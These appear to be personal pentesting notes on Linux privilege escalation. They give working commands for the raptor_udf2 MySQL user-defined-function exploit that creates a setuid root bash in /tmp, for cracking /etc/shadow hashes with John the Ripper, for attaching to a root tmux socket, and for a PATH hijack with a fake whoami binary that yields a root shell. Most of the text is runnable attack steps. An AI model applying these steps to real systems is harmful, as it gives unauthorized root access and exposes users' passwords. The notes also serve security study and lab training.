# Linux Privilege Escalation

Tags :

## Contents
[Mysql Service as root](#MySQL-Service-as-root)
[Hash Cracking](#Hash-Cracking)

## MySQL Service as root

if mysql service is running as root and we have root credentials then we can execute commands via **User-DefinedFunctions**

this exploit works for mysql 4.x/5.0
Download [here](https://www.exploit-db.com/download/1518)
save it as raptor_udf2.c 

Now Compile into object and sharedobjects
```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

then connect to mysql 
in that we create a new table and load this sharedobject into that table
we then copy contents into original raptor_udf2.so file

```bash
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

then we can execute commands as arguments to our function
```bash
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

now we have copied bash into tmp and added s bit on
so we can run that as root by default
```
/tmp/rootbash -p
```


## Hash Cracking

when user set weak password , it can be cracked with johntheripper
password hashes are found in **/etc/shadow** file 
this file contents are generally cannot be readable by any user
if incase normal user can read this file then we can try to bruteforce hashes
copy hash into a file
```
./john --format=sha512crypt -w=rockyou.txt hashfile
```
if the password is in rockyou.txt you will get password


## Tmux Socket Sessions

tmux can be left open by root user or any other user
using ps command we can verify on which socket tmux is running

```
ps -aux | grep tmux
tmux -S /tmp/socket
```
you will get a tmux session


## VNC Sessions

## PATH Variable Manipulation

we have binary and it executes another binary but it doesnot uses absolutepath it only uses relative path
in that case we can write fake binary in that directory
if the directory is not writable we can create fake binary in /tmp and can change PATH variable

here we have binary and its source code
if we dont have source code , we can apply strings on that binary
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");
    char user[80];
    fgets(user, 80, f);
    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());
    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}

```

we can see popen function and whoami binary is not full path 
popen function executes the binary specified and takes that binary's output into filestream
and script checks if we are tom user then it drops root shell
let's create a binary in /tmp named whoami

```bash
touch /tmp/whoami
echo "echo tom" > /tmp/whoami
chmod +x /tmp/whoami
```

now we need to change PATH variable because by default rootshell binary takes from /bin

```bash
export PATH=/tmp:$PATH
```

now run the rootshell binary and we get root shell